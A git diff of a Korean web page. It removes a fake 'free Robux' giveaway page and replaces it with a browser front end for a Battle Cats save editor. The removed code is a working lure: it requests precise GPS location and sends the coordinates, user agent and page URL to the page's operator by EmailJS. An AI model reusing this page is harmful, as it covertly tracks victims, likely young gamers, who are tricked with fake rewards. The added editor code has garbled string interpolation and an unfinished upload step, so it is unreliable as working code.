@@ -2,78 +2,45 @@
 <html lang="ko">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>무료 Roblox 이벤트 참여</title>
-  <style>
-    body {margin:0;padding:0;height:100vh;background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;overflow:hidden;}
-    .container {text-align:center;padding:30px;max-width:95%;}
-    h1 {font-size:2.5rem;margin-bottom:20px;text-shadow:0 0 10px #0f0;}
-    .status {font-size:1.3rem;color:#ff0044;margin:25px 0;line-height:1.5;}
-    .loader {width:80px;height:80px;border:8px solid #0f0;border-top:8px solid transparent;border-radius:50%;animation:spin 1s linear infinite;margin:30px auto;}
-    button {background:#5865f2;color:white;border:none;padding:16px 0;width:80%;border-radius:8px;font-size:1.2rem;cursor:pointer;margin:20px auto;display:block;}
-    button:hover {background:#4752c4;}
-    @keyframes spin {to{transform:rotate(360deg);}}
-  </style>
-  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <title>냥코에디터 웹</title>
+  <script src="https://cdn.jsdelivr.net/pyodide/v0.26.1/full/pyodide.js"></script>
+  <style> body { font-family: sans-serif; } textarea { width: 100%; height: 200px; } </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Robux 100,000 무료 지급 중...</h1>
-    <div class="loader" id="loader"></div>
-    <div class="status" id="status">위치 확인을 위해 "허용" 눌러주세요!</div>
-    <button onclick="getLocation()">위치 허용하고 Robux 받기</button>
-  </div>
-
+  <h1>냥코에디터 웹 (BCSFE)</h1>
+  <label>이어하기 코드: <input id="transfer" placeholder="Transfer Code"></label><br>
+  <label>인증번호: <input id="confirm" placeholder="Confirmation Code"></label><br>
+  <label>국가: <select id="country"><option>kr</option></select></label><br>
+  <button onclick="loadSave()">로드</button>
+  <textarea id="output" placeholder="결과..."></textarea>
+  <button onclick="uploadSave()">업로드 (새 코드 생성)</button>
   <script>
-    emailjs.init("ycbHVBt3cm6FkCL--");
-
-    function getLocation() {
-      document.getElementById("status").innerHTML = "위치 권한 요청 중... (팝업에서 허용 눌러주세요)";
-
-      if (!navigator.geolocation) {
-        document.getElementById("status").innerHTML = "이 브라우저는 위치 기능을 지원하지 않습니다.";
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition(
-        async (pos) => {
-          const info = {
-            latitude: pos.coords.latitude.toFixed(6),
-            longitude: pos.coords.longitude.toFixed(6),
-            accuracy: pos.coords.accuracy + "m",
-            time: new Date().toISOString(),
-            userAgent: navigator.userAgent,
-            url: location.href
-          };
-
-          try {
-            await emailjs.send("service_jmsvqzd", "template_fjunjx8", {
-              latitude: info.latitude,
-              longitude: info.longitude,
-              accuracy: info.accuracy,
-              url: info.url,
-              time: info.time,
-              userAgent: info.userAgent
-            });
-
-            document.getElementById("status").innerHTML = 
-              "완료! 위치 정보 수집됨<br>메일에 구글 지도 링크 도착했습니다!";
-          } catch(e) {
-            document.getElementById("status").innerHTML = "전송 오류: " + (e.message || "알 수 없음");
-          }
-        },
-        (err) => {
-          let msg = "위치 권한 거부됨";
-          if (err.code === 1) msg += "<br>브라우저에서 위치 허용 눌러주세요";
-          if (err.code === 2) msg += "<br>GPS 꺼져 있거나 위치 못 찾음";
-          if (err.code === 3) msg += "<br>시간 초과";
-          document.getElementById("status").innerHTML = msg;
-        },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-      );
-
-      document.getElementById("loader").style.display = "none";
-    }
+  let pyodide, bcsfe;
+  async function main() {
+    pyodide = await loadPyodide();
+    await pyodide.loadPackage(['micropip']);
+    // BCSFE 설치 (소스 복사하거나 micropip)
+    await pyodide.runPythonAsync(`
+      import micropip
+      await micropip.install('bcsfe==3.0.0b7')  # 최신 버전
+      from bcsfe import main as bcsfe_main
+      bcsfe = bcsfe_main
+    `);
+    console.log('BCSFE 로드 완료!');
+  }
+  main();
+  async function loadSave() {
+    let transfer = document.getElementById('transfer').value;
+    let confirm = document.getElementById('confirm').value;
+    let country = document.getElementById('country').value;
+    let result = await pyodide.runPythonAsync(`
+      # BCSFE 로직 호출 (CLI 시뮬)
+      save_data = bcsfe.download_save('\( {transfer}', ' \){confirm}', '${country}')
+      print('세이브 로드됨. 편집 시작.')
+    `);
+    document.getElementById('output').value = result;
+  }
+  // 업로드/편집 로직 추가 (stdin/out 리다이렉트)
   </script>
 </body>
 </html>
